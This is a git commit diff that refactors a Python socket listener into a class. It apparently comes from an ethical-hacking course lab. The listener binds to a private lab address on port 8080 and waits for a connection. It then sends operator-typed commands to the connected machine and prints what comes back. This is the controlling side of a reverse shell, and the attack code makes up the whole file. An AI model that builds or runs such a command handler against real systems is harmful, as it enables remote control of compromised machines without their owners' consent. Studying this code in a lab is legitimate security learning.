2a61acdf0cf22984d5cc343fe0bb1e715d9948e7
Mousa Muigai <mousa@mousa.Mousa>
2026-05-15 11:08:43 +0300

    Socket Listener

--- socketListener.py
+++ socketListener.py
@@ -1,17 +1,26 @@
 import socket
 
-listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)  # Use instance multiple times
-listener.bind(("10.0.2.10",8080))
-listener.listen(0)
-print("Listening on port 8080...")
+class SocketListener:
+    def __init__(self,ip,port):
+        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)  # Use instance multiple times
+        listener.bind((ip,port))
+        listener.listen(0)
+        print(f"Listening on port {port}...")
 
-(connection,address) = listener.accept()
+        (self.connection,address) = listener.accept()
 
-print("Listening established..." + str(address))
+        print("Listening established..." + str(address))
 
-while True:
-    command_input = raw_input("Enter command: ")
-    connection.send(command_input)
-    command_output = connection.recv(1024)
-    print(command_output)
+    def command_execution(self,command_input):
+        self.connection.send(command_input)
+        return self.connection.recv(1024)
+
+    def start_listener(self):
+        while True:
+            command_input = raw_input("Enter command: ")
+            command_output = self.command_execution(command_input)
+            print(command_output)
+
+socket_listener = SocketListener("10.0.2.10",8080)
+socket_listener.start_listener()
